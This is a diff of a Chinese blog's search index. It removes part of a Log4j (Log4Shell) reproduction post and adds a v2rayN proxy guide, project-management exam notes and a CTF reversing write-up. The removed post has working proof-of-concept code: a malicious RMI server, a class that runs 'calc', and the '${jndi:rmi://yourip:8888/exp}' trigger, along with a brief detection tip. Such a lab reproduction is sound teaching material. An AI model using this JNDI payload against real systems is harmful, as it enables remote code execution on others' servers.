RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 8888&quot;</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>恶意对象模拟执行cmd打开计算器，并且输出一个语句用于标记执行处</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jRCE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;exec in here&quot;</span>);</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行RMIServer，创建RMI服务</p>
-<h3 id="构建EXP触发目标服务器进行日志记录触发JNDI解析"><a href="#构建EXP触发目标服务器进行日志记录触发JNDI解析" class="headerlink" title="构建EXP触发目标服务器进行日志记录触发JNDI解析"></a>构建EXP触发目标服务器进行日志记录触发JNDI解析</h3><p>构建恶意用户名模拟输入，执行触发恶意解析</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://yourip:8888/exp&#125;&quot;</span>;</span><br><span class="line">        logger.error(username + <span class="string">&quot;is login on $&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"><a href="#解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码" class="headerlink" title="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"></a>解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</h3><p>恶意代码被执行，注意看恶意代码执行记录，是在日志记录的地方被执行</p>
-<p><img src="https://s2.loli.net/2021/12/14/RBLCYQ1laAiXvpD.png" alt="res.png"></p>
-<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>看看大佬们都干了啥</p>
-<p><a href="https://m.weibo.cn/status/4713921489404877?wm=3333_2001&amp;from=10BC193010&amp;sourcetype=weixin">特斯拉测试</a><br><a href="https://mp.weixin.qq.com/s/tIv68iiGcXg-Fl4MQY0SGQ">主要利用模式</a></p>
-<h1 id="修复与检测"><a href="#修复与检测" class="headerlink" title="修复与检测"></a>修复与检测</h1><p>可以通过<code>$&#123;jndi</code>字串匹配是否受到攻击</p>
-<p>修复参考链接：</p>
-<p><a href="https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg">https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg</a></p>
-<p><a href="https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g">https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前已证实服务器易受到漏洞攻击的公司包括苹果、亚马逊、特斯拉、谷歌、百度、腾讯、网易、京东、Twitter、 Steam等。据统计，共有<strong>6921</strong>个应用程序都有被攻击的风险，其中《我的世界》首轮即被波及。就连修改iPhone手机名称都能触发，<font color="red">最主要的是这是国外黑客玩了几个月玩腻了才公开的漏洞！</font></p>
-<p>一个范围广的0day漏洞可能导致整个互联网沦为肉鸡或者瘫痪，网络安全，任重而道远。</p>
-<p>不过早在11月24日，阿里云就监测到了在野攻击并给apache报告了，只是apache新出的版本只是拦截了ldap，其他协议依旧有效。所以公开后很快被腾讯团队测试可绕过，当天发出修复版本Log4j 2.15.0-rc2</p>
+    <title>使用v2rayN免费科学上网</title>
+    <url>/2021/11/14/%E4%BD%BF%E7%94%A8v2rayN%E5%85%8D%E8%B4%B9%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重要的事情说三遍：</p>
+<ul>
+<li>仅供学习用途，请勿非法使用! </li>
+<li>仅供学习用途，请勿非法使用! </li>
+<li>仅供学习用途，请勿非法使用! </li>
+</ul>
+<h2 id="V2rayN使用"><a href="#V2rayN使用" class="headerlink" title="V2rayN使用"></a>V2rayN使用</h2><h3 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h3><p>直接上链接：</p>
+<blockquote>
+<p>windows: <a href="https://github.com/2dust/v2rayN/releases/latest">v2rayN · GitHub</a>，访问不了Github的看<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决github访问失败 | Hackt0’s Blog</a>，觉得下载慢的我下载了一份4.20版本的放在<a href="https://www.lanzouw.com/iglZHwgmzje">v2rayN_v4.20</a></p>
+<p>Android: <a href="https://github.com/2dust/v2rayNG/releases/tag/1.6.23">v2rayNG · GitHub</a>，觉得下载慢的同样也下载了一份1.6.23版本在<a href="https://pan.lanzoui.com/idYLUwgmzmh?w">v2rayNG_1.6.23.apk</a></p>
+</blockquote>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>解压后运行v2rayN.exe，打开选项<code>订阅——设置订阅</code><br><img src="https://i.loli.net/2021/11/10/y8Ul4ZAJK2WE67R.png" alt="49c2f0a9d2c8c5655cbbe637872d107.png"></p>
+<p>地址填<code>https://raw.fastgit.org/freefq/free/master/v2</code>，备注随意，然后点击添加即可<br><img src="https://i.loli.net/2021/11/10/5gCvrDL1pxPjtsV.png" alt="b68fa6ac30e2d4095de6cc74d625242.png"></p>
+<p>再到主界面打开选项<code>订阅————刷新订阅</code>，这是就能看到地址列表了，全选后右键测速<br><img src="https://i.loli.net/2021/11/10/WJlkafCPohuqHg6.png" alt="edeb55c10106670ad80a94a5d1df612.png"></p>
+<p>选择网速最快的地址右键设为活动服务器即可<br><img src="https://i.loli.net/2021/11/10/Btwf7XOGmySYIds.png" alt="826097485a238b800b29ab02eb615a5.png"></p>
+<p>最后桌面右下角托盘打开系统代理，红色即为开启<br><img src="https://i.loli.net/2021/11/10/4PltaK6NY5HjJLA.png" alt="10e919246046b6d8c3a51abfcb8da60.png"></p>
+<p>手机使用方法一致，添加相同规则即可。</p>
 ]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>VPN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息系统项目管理基础</title>
+    <url>/2022/03/29/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h3 id="项目管理基础"><a href="#项目管理基础" class="headerlink" title="项目管理基础"></a>项目管理基础</h3><h4 id="项目的概念"><a href="#项目的概念" class="headerlink" title="项目的概念"></a>项目的概念</h4><p>&emsp;&emsp;项目是为提供一项独特产品、服务或成果所做的临时性努力</p>
+<h4 id="项目的特点"><a href="#项目的特点" class="headerlink" title="项目的特点"></a>项目的特点</h4><p>项目的特点主要表现在以下几个方面：</p>
+<ol>
+<li>临时性(一次性)：临时性是指每一个项目都有确定的开始和结束日期</li>
+<li>独特的产品、服务或成果：项目创造独特的可交付成果，如产品、服务或成果</li>
+<li>逐步完善：逐步完善是项目伴随临时性和独特性两个概念的特点之一。逐步意味着分步、连续和积累。</li>
+<li>资源约束：每一个项目都需要具备各种资源来作为实施的保证，而资源是有限的。所以，资源成本是项目成功实施的一个约束条件。</li>
+<li>目的性：项目工作的目的在于得到特定的结果，即项目是面向目标的</li>
+</ol>
+<p>项目的四个约束：</p>
+<p>&emsp;&emsp;时间、成本和质量是项目工作的三个主要目标， 为取得项目的成功， 必须同时考虑时间、成本和质量三个因素， 这三个目标经常存在冲突。另一个主要的约束是项目的范围。项目经理的责任就是在四个要素之间进行权衡以保证项目成功。</p>
+<h4 id="项目与日常运作的关系"><a href="#项目与日常运作的关系" class="headerlink" title="项目与日常运作的关系"></a>项目与日常运作的关系</h4><p>无重要考点</p>
+<h4 id="项目和战略规划"><a href="#项目和战略规划" class="headerlink" title="项目和战略规划"></a>项目和战略规划</h4><p>战略管理包括以下三个过程：</p>
+<ol>
+<li>战略制定： 确定企业任务， 认定企业的外部机会与威胁，认定企业内部优势与弱点， 建立长期目标， 制定供选择战略， 以及选择特定的实施战略。</li>
+<li>战略实施：树立年度目标、制定政策、激励员工和配置资源， 以便使制定的战略得以贯彻执行。</li>
+<li>战略评价：重新审视外部与内部因素；度量业绩；采取纠偏措施。</li>
+</ol>
+<p>&emsp;&emsp;对于典型的项目型企业， 一般在企业的战略实施过程中， 将<strong>企业的战略转化为一系列的项目</strong>来实施企业的战略， 按多项目或项目群来管理各个项目， 达到企业的战略目标。—个优秀的项目经理应该了解企业的商业战略目标， 与企业高层管理者紧密合作。</p>
+<h4 id="信息系统项目的特点"><a href="#信息系统项目的特点" class="headerlink" title="信息系统项目的特点"></a>信息系统项目的特点</h4><p>&emsp;&emsp;典型的信息系统项目有如下特点：</p>
+<pre><code>目标不明确。
+需求变化频繁。
+智力密集型。
+设计队伍庞大。
+设计人员高度专业化。
+涉及的承包商多。
+各级承包商分布在各地， 相互联系复杂。
+系统集成项目中需研制开发大量的软硬件系统。
+项目生命期通常较短。
+通常要采用大量的新技术。
+使用与维护的要求非常复杂。
+</code></pre><h4 id="项目管理的定义"><a href="#项目管理的定义" class="headerlink" title="项目管理的定义"></a>项目管理的定义</h4><p>&emsp;&emsp;项目管理就是把各种知识、技能、手段和技术应用千项目活动之中， 以达到项目的要求。项目管理是通过应用和综合诸如<strong>启动、计划、实施、监控和收尾</strong>等项目管理过程来进行的。</p>
+<h4 id="项目管理的特点"><a href="#项目管理的特点" class="headerlink" title="项目管理的特点"></a>项目管理的特点</h4><p>无重要考点</p>
+<h3 id="项目管理知识体系构成"><a href="#项目管理知识体系构成" class="headerlink" title="项目管理知识体系构成"></a>项目管理知识体系构成</h3><h4 id="项目管理知识体系"><a href="#项目管理知识体系" class="headerlink" title="项目管理知识体系"></a>项目管理知识体系</h4><p>无重要考点</p>
+<h4 id="应用领域的知识、标准和规定"><a href="#应用领域的知识、标准和规定" class="headerlink" title="应用领域的知识、标准和规定"></a>应用领域的知识、标准和规定</h4><p>无重要考点</p>
+<h4 id="理解项目环境"><a href="#理解项目环境" class="headerlink" title="理解项目环境"></a>理解项目环境</h4><p>无重要考点</p>
+<h4 id="一般的管理知识技能"><a href="#一般的管理知识技能" class="headerlink" title="一般的管理知识技能"></a>一般的管理知识技能</h4><p>无重要考点</p>
+<h4 id="软技能"><a href="#软技能" class="headerlink" title="软技能"></a>软技能</h4><p>(三、四年考一分)软技能包括人际关系管理。软技能包含以下内容:</p>
+<ol>
+<li>有效的沟通： 信息交流。</li>
+<li>影响—个组织： “让事情办成＂ 的能力。</li>
+<li>领导能力： 形成—个前景和战略并组织人员达到它。</li>
+<li>激励：激励人员达到高水平的生产率并克服变革的阻力。</li>
+<li>谈判和冲突管理： 与其他人谈判或达成协议。</li>
+<li>问题解决： 问题定义和做出决策的结合。</li>
+</ol>
+<h3 id="IPMP-PMP"><a href="#IPMP-PMP" class="headerlink" title="IPMP/PMP"></a>IPMP/PMP</h3><p>无重要考点</p>
+<h3 id="PRINCE2"><a href="#PRINCE2" class="headerlink" title="PRINCE2"></a>PRINCE2</h3><h4 id="PRINCE2-定义与结构"><a href="#PRINCE2-定义与结构" class="headerlink" title="PRINCE2 定义与结构"></a>PRINCE2 定义与结构</h4><p>&emsp;&emsp;PRINCE2提供最佳的项目管理方法论， 更加接近项目的实施， 更加重视项目的实际收益和回报。</p>
+<p>&emsp;&emsp;PRINCE2是一种基于流程的结构化项目管理方法。</p>
+<p>&emsp;&emsp;PRINCE2旨在以—种适千广泛项目环境的方式组织安排和着重介绍项目管理知识。</p>
+<p>&emsp;&emsp;PRINCE2假设了解和采用该方法的用户具有—定的经验， 能够自行填补其省略的细节。</p>
+<p>&emsp;&emsp;PRINCE2包括4个被称为要素的主要部分。 这4个要素包括<strong>原则、 流程、 主题以及项目环境</strong>。</p>
+<h4 id="PRINCE2-原则"><a href="#PRINCE2-原则" class="headerlink" title="PRINCE2 原则"></a>PRINCE2 原则</h4><p>&emsp;&emsp;（不要求看）PRINCE2方法具有七个原则：</p>
+<pre><code>持续业务验证
+吸取经验教训
+明确定义的角色和职责
+按阶段管理
+例外管理
+关注产品——由于成功的项目是以产出（而非活动）为导向
+根据项目环境剪裁——认识到项目管理没有严格（精确）的公式
+</code></pre><h3 id="组织结构对项目的影响"><a href="#组织结构对项目的影响" class="headerlink" title="组织结构对项目的影响"></a>组织结构对项目的影响</h3><h4 id="组织体系"><a href="#组织体系" class="headerlink" title="组织体系"></a>组织体系</h4><p>无重要考点</p>
+<h4 id="组织的文化与风格"><a href="#组织的文化与风格" class="headerlink" title="组织的文化与风格"></a>组织的文化与风格</h4><p>&emsp;&emsp;（不重要）组织文化常常会对项目产生直接的影响。例如：</p>
+<pre><code>在一个进取心较强或具有开拓精神的组织中， 团队所提出的非常规的或高风险性的建议更容易获得批准。
+在一个等级制度严格的组织中， —个喜欢高度参与的项目经理可能经常会遇到麻烦。而在一个很民主的组织中， 一个喜欢独裁的项目经理同样也会受到挑战。
+</code></pre><h4 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h4><p>&emsp;&emsp;<font color="red">与项目有关的主要企业组织结构类型的关键特征：</font></p>
+<p><img src="https://s2.loli.net/2022/03/29/WsgLfOpcSNQvUMX.png" alt="image-20220329173732284"></p>
+<p>&emsp;&emsp;1. <font color="red">职能型组织的优点体现在如下方面：</font></p>
+<pre><code>- 强大的技术支持，便于知识、技能和经验的交流
+- 清晰的职业生涯晋升路线
+- 直线沟通、交流简单、责任和权限很清晰
+- 有利于重复性工作为主的过程管理
+</code></pre><p>&emsp;&emsp;<font color="red">同时，职能型组织也存在着如下缺点：职能利益优先于项目，具有狭隘性；组织横向之间的联系薄弱、部门间沟通、协调难度大；项目经理极少或缺少权力、权威；项目管理发展方向不明，缺少项目基准等。</font></p>
+<p>&emsp;&emsp;2. <font color="red">项目型组织的优点体现在如下方面：</font></p>
+<pre><code>- 结构单一，责权分明，利于统一指挥
+- 目标明确单一
+- 沟通简洁、方便
+- 决策快
+</code></pre><p>&emsp;&emsp;<font color="red">同时，项目型组织也存在着如下缺点：管理成本过高，如项目的工作量不足则资源配置效率低；项目环境比较封闭，不利于沟通、技术知识等共享；员工缺乏事业上的连续型和保障等。</font></p>
+<p>&emsp;&emsp;3. 矩阵型组织的优点体现在如下方面：</p>
+<pre><code>- 项目经理负责制、有明确的项目目标
+- 改善了项目经理对整体资源的控制
+- 及时响应
+- 获得职能组织更多的支持
+- 最大限度地利用公司的稀缺资源
+- 降低了跨职能部门间的协调合作难度
+- 使质量、成本、时间等制约因素得到更好的平衡
+- 团队成员有归属感，士气高，问题少。
+- 出现的冲突较少，且易处理解决
+</code></pre><p>&emsp;&emsp;<font color="red">同时，矩阵型组织也存在着如下缺点：管理成本增加；多头领导；难以监测和控制；资源分配与项目优先的问题产生冲突；权力难以保持平衡等。</font></p>
+<p>&emsp;&emsp;<font color="red">以下五种图必须要能区分</font></p>
+<p><img src="https://s2.loli.net/2022/03/29/mZO5fw6c1UESMyK.png" alt="image-20220329185209272"></p>
+<p><img src="https://s2.loli.net/2022/03/29/NobHpM4cKO8PzfX.png" alt="image-20220329185302964"></p>
+<p><img src="https://s2.loli.net/2022/03/29/TK43lu85VzEfNQP.png" alt="image-20220329185351266"></p>
+<p><img src="https://s2.loli.net/2022/03/29/VX49j7ZAKmdFufE.png" alt="image-20220329185425806"></p>
+<p><img src="https://s2.loli.net/2022/03/29/oRy7HA1eFk2NjG3.png" alt="image-20220329185508116"></p>
+<h4 id="PMO在组织结构中的作用"><a href="#PMO在组织结构中的作用" class="headerlink" title="PMO在组织结构中的作用"></a>PMO在组织结构中的作用</h4><p>&emsp;&emsp;根据需要，可以为一个项目设立一个PMO(Project Management Office 项目管理办公室)，可以为一个部门设立一个PMO，也可以为一个企业设立一个PMO，这三级PMO可以在组织内同时存在。</p>
+<p>&emsp;&emsp;（中级考过案例分析）以下列出PMO的一些关键特征，但不限于此：</p>
+<pre><code>1. 在所有PMO管理的项目之间共享和协调资源
+2. 明确和制定项目管理的方法、最佳实践和标准
+3. 负责制订项目方针、流程、模板和其他共享
+4. 为所有项目进行集中的配置管理
+5. 对所有项目的集中的共同风险和独特风险存储库加以管理
+6. 项目工具（如企业级项目管理软件）的实施和管理中心
+7. 项目之间的沟通管理协调中心
+8. 对项目经理进行指导的平台
+9. 通常对所有PMO管理的项目的时间基线和预算进行集中监控
+10. 在项目经理和任何内部或外部的质量人员或标准化组织之间协调整体项目的质量标准
+</code></pre><h3 id="信息系统项目的生命周期"><a href="#信息系统项目的生命周期" class="headerlink" title="信息系统项目的生命周期"></a>信息系统项目的生命周期</h3><h4 id="项目生命周期的基础"><a href="#项目生命周期的基础" class="headerlink" title="项目生命周期的基础"></a>项目生命周期的基础</h4><p>无重要考点</p>
+<h4 id="项目生命周期的特征"><a href="#项目生命周期的特征" class="headerlink" title="项目生命周期的特征"></a>项目生命周期的特征</h4><p>&emsp;&emsp;成本与人力投入在开始时较低， 在工作执行期间达到最高， 并在项目快要结束时迅速回落。</p>
+<p><img src="https://s2.loli.net/2022/03/29/2jFWzktMnT9ylm8.png" alt="image-20220329191125399"></p>
+<p>&emsp;&emsp;（干系人对项目的影响同）风险与不确定性在项目开始时最大， 并在项目的整个生命周期中随着决策的制定与可交付成果的验收而逐步降低。</p>
+<p>&emsp;&emsp;做出变更和纠正错误的成本， 随着项目越来越接近完成而显著增高。</p>
+<p><img src="https://s2.loli.net/2022/03/29/z6LHBky4p5GOdtr.png" alt="image-20220329191240805"></p>
+<h4 id="项目阶段"><a href="#项目阶段" class="headerlink" title="项目阶段"></a>项目阶段</h4><p>&emsp;&emsp;项目阶段是一组具有逻辑关系的项目活动的集合，通常以一个或多个可交付成果的完成为结束。</p>
+<p>&emsp;&emsp;阶段与阶段的关系有两种基本类型：(1) 顺序关系。(2)交叠关系。 </p>
+<h3 id="信息系统项目典型生命周期模型"><a href="#信息系统项目典型生命周期模型" class="headerlink" title="信息系统项目典型生命周期模型"></a>信息系统项目典型生命周期模型</h3><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>&emsp;&emsp;<font color="red">瀑布模型是—个经典的软件生命周期模型，—般将软件开发分为： 可行性分析（计划）、需求分析、软件设计（概要设计、详细设计）、编码（含单元测试）、测试、运行维护等几个阶段</font></p>
+<p>&emsp;&emsp;<font color="red">（瀑布<strong>模型</strong>与结构化<strong>方法</strong>相同（若需求明确，一步一步往下做，并且每个阶段进行评审））</font></p>
+<p><img src="https://s2.loli.net/2022/03/29/pV21nJH74LwjBTy.png" alt="image-20220329192045208"></p>
+<font color="red">瀑布模型的特点：</font>
+
+<ol>
+<li><font color="red">从上一项开发活动接受该项活动的工作对象作为输入。</font>
+</li>
+<li><font color="red">利用这一输入， 实施该项活动应完成的工作内容。</font>
+</li>
+<li><font color="red">给出该项活动的工作成果， 作为输出传给下一项开发活动。</font>
+
+<font color="red">（即上一个过程的输出为下一个过程的输入）</font>
+</li>
+<li><font color="red">对该项活动的实施工作成果进行评审。 若其工作成果得到确认， 则继续进行下—项开发活动； 否则返回前—项， 甚至更前项的活动。 尽量减少多个阶段间的反复。 以相对来说较小的费用来开发软件。</font>
+
+</li>
+</ol>
+<h4 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><p>&emsp;&emsp;螺旋模型是一个演化软件过程模型， 将<strong>原型实现的迭代特征与线性顺序（瀑布）模型</strong>中控制的和系统化的方面结合起来。</p>
+<p>&emsp;&emsp;<font color="red">四个象限分别标志每个周期所划分的四阶段： 制订计划、风险分析、实施工程和客户评估。螺旋模型强调了<strong>风险分析</strong>， 特别适用于<strong>庞大而复杂的、高风险的系统</strong>。</font></p>
+<p><img src="C:/Users/15502/AppData/Roaming/Typora/typora-user-images/image-20220329192916329.png" alt="image-20220329192916329"></p>
+<h4 id="迭代模型"><a href="#迭代模型" class="headerlink" title="迭代模型"></a>迭代模型</h4><p>&emsp;&emsp;迭代式开发模型， 如图2-14所示，<font color="red"> 水平方向为时间维， 从组织管理的角度描述整个软件开发生命周期 ， 分四个阶段：初始、 细化、 构造、 移交， 可进—步描述为周期(Cycle)、阶段(Phase)、 迭代(Iteration)；</font>核心工作流从技术角度描述迭代模型的静态组成部分，包括： <strong>业务建模、 需求获取、 分析与设计、 实现、 测试、 部署</strong>。 图中的阴影部分描述了不同的工作流， 在不同的时间段内工作量的不同， <font color="red">几乎所有的<strong>工作流在所有的时间段内均有工作量， 只是大小不同而已</strong>。(即反复迭代)</font> 各阶段的主要任务如下：</p>
+<pre><code>初始阶段：系统地阐述项目的范围 ， 选择可行的系统构架， 计划和准备业务案例。
+细化阶段：细化构想， 细化过程和基础设施， 细化构架并选择构件。
+构造阶段：资源管理、 控制和过程最优化， 完成构件的开发并依评价标准进行测试， 依构想的验收标准评估产品的发布。
+移交阶段：同步并使并发的构造增量集成到一致的实施基线中，与实施有关的工程活动（商业包装和生产、人员培训等），根据完整的构想和需求集的验收标准评估实施基线。
+</code></pre><font color="red"> &emsp;&emsp;RUP强调软件开发是一个迭代模型</font>
+
+<p><img src="https://s2.loli.net/2022/03/29/SkR5NJeD8AQzMiK.png" alt="image-20220329193025465"></p>
+<h4 id="V模型"><a href="#V模型" class="headerlink" title="V模型"></a>V模型</h4><p>&emsp;&emsp;V模型从整体上看起来， 就是一个V字型的结构， 由左右两边组成。左边的下画线分别代表了需求分析、概要设计、详细设计、编码。右边的上画线代表了单元测试、集成测试、系统测试与验收测试</p>
+<p>V模型的特点：</p>
+<ul>
+<li>V模型体现的主要思想是开发和测试同等重要， 左侧代表的是开发活动， 而右侧代表的是测试活动。</li>
+<li><font color="red">模型针对每个开发阶段， 都有一个测试级别与之相对应。</font>
+1. <font color="red">单元测试的主要目的是针对编码过程中可能存在的各种错误</font>
+2. <font color="red">集成测试的主要目的是针对详细设计中可能存在的问题</font>
+3. <font color="red">系统测试主要针对概要设计，检查系统作为一个整体是否有效地得到运行</font>
+4. <font color="red">验收测试通常由业务专家或者用户进行，以确认产品能否真正符合用户业务上的需要</font>
+
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/03/29/ESIwMpo3AO9TGlm.png" alt="image-20220329194622240"></p>
+<ul>
+<li>测试依旧是开发生命周期中的阶段， 与瀑布模型不同的是， 有多个测试级别与开发阶段对应。</li>
+<li><font color="red">V模型适用于需求明确和需求变更不频繁的情形。</font>
+
+</li>
+</ul>
+<h4 id="原型化模型"><a href="#原型化模型" class="headerlink" title="原型化模型"></a>原型化模型</h4><p>&emsp;&emsp;原型化模型第—步就是创建一个快速原型， 能够满足项目干系人与未来的用户可以与原型进行交互， 再通过与相关干系人进行充分的讨论和分析， 最终弄清楚当前系统的需求， 进行了充分的了解之后， 在原型的基础上开发出用户满意的产品。</p>
+<p>&emsp;&emsp;原型法用于很难—下子全面准确地提出用户需求的情况下</p>
+<p>原型应当具备的特点如下：</p>
+<pre><code>1. 实际可行。
+2. 具有最终系统的基本特征。
+3. 构造方便、快速，造价低。
+</code></pre><p>&emsp;&emsp;原型法的特点在于原型法对用户的需求是<strong>动态响应、逐步纳入</strong>的</p>
+<h4 id="敏捷开发模型"><a href="#敏捷开发模型" class="headerlink" title="敏捷开发模型"></a>敏捷开发模型</h4><p>&emsp;&emsp;（建议了解，非历年考试重点）敏捷开发是一种以人为核心、迭代、循序渐进的开发方法， 相对于传统软件开发方法的“ 非敏捷＂，更强调程序员团队与业务专家之间的紧密协作、面对面的沟通（认为比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好地适应需求变化的代码编写和团队组织方法， 也更注重软件开发中人的作用。</p>
+<p>&emsp;&emsp;Scrum是—种迭代式增量软件开发过程， 通常用千敏捷软件开发</p>
+<h3 id="单个项目的管理过程"><a href="#单个项目的管理过程" class="headerlink" title="单个项目的管理过程"></a>单个项目的管理过程</h3><p>&emsp;&emsp;项目管理就是将知识、技能、工具和技术应用于项目活动之中， 以满足项目的要求。它是通过利用项目管理知识、技能、工具和技术的过程实现的，这些过程凭借每个过程的输入条件创造出成果。</p>
+<p>&emsp;&emsp;<font color="red">项目管理各过程组成的5 个过程组可以对应到PDCA循环， 即戴明环： ”计划(Plan)—执行(Do)—检查(Check)—行动(Act)”循环。</font></p>
+<p>&emsp;&emsp;<font color="red">按项目管理过程在项目管理中的职能可以将组成项目的各个过程归纳为5组， 叫作项目管理过程组： (1)启动过程组；(2)计划过程组； (3)执行过程组；(4)监督与控制过程组；(5)收尾过程组</font></p>
+<ol>
+<li><font color="red">启动过程组定义并批准项目或项目阶段。包括**“ 制定项目章程” 和“ 识别项目干系人”** 两个过程。</font></li>
+<li><font color="red">计划过程组定义和细化目标， 并为实现项目而要达到的目标和完成项目要解决的问题范围而规划必要的行动路线。</font></li>
+<li><font color="red">执行过程组整合人员和其他资源， 在项目的生命期或某个阶段执行项目管理计划。</font></li>
+<li><font color="red">监督与控制过程组要求定期测量和监控项目绩效情况， 识别与项目管理计划的偏差，以便在必要时采取纠正措施，确保项目或阶段目标达成</font></li>
+<li><font color="red">收尾过程组正式验收产品、服务或工作成果，有序的结束项目或项目阶段。包括项目整体管理中的 **“ 结束项目或阶段“** 过程，项目采购管理中的 **“结束采购“** 过程。</font>
+
+</li>
+</ol>
+<h4 id="过程间的相互联系与交互作用"><a href="#过程间的相互联系与交互作用" class="headerlink" title="过程间的相互联系与交互作用"></a>过程间的相互联系与交互作用</h4><p>&emsp;&emsp;项目管理计划和项目范围说明书，并随着项目的绩效经常更新该项目管理计划。此外，过程组极少是孤立或只执行一次的事件，它们是在<strong>整个项目生命期内自始至终都以不同的程度互相重叠的活动。若将项目划分为阶段，则过程组不但在阶段内，而且也可能跨越阶段相互影响和相互作用。</strong></p>
+<p><img src="https://s2.loli.net/2022/03/29/LjreGtKoVgyW7a1.png" alt="image-20220329201103195"></p>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>Textual Criticism</tag>
       </tags>
   </entry>
   <entry>
@@ -1328,6 +1328,35 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </tags>
   </entry>
   <entry>
+    <title>身在何处wp</title>
+    <url>/2021/11/15/%E8%BA%AB%E5%9C%A8%E4%BD%95%E5%A4%84wp/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来自于<a href="https://ctf.pediy.com/game-team_list-15-21.htm">看雪CTF (pediy.com)</a></p>
+<p>原题下载链接：<a href="https://pan.lanzoui.com/ip5mnwj2nlc?w">kctf2021.rar - 蓝奏云 (lanzoui.com)</a></p>
+<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>通过字符串Success!直接定位到关键函数</p>
+<blockquote>
+<p>关键点在于第二次f_generate生成的字符串要与0x1388C77相等</p>
+<p>f_generate生成值与传入的参数有关，相同参数返回相同结果</p>
+<p><img src="https://i.loli.net/2021/11/15/aBHn3JOLhvTYldA.png" alt="func.png"></p>
+</blockquote>
+<p>f_generate分成两个部分</p>
+<blockquote>
+<p>第一部分与参数无关，通过循环加异或生成一个固定字符串0x2D02EF80</p>
+<p>再与传入的字符串参数作用生成j，最后取~j作为返回值</p>
+<p><img src="https://i.loli.net/2021/11/15/zbsx4K9vTf8VkBW.png" alt="func2.png"></p>
+</blockquote>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>因为最后只要将序列号和由用户名生成的随机数进行异或，得到的值再传入f_generate能生成0x13B88C77即可，所以直接获取题目中包含的用户名和序列号，得到第二次传入的值0x52A1ED5A</p>
+<p><img src="https://i.loli.net/2021/11/15/xiA51tBo9U2dKTW.png" alt="number.png"></p>
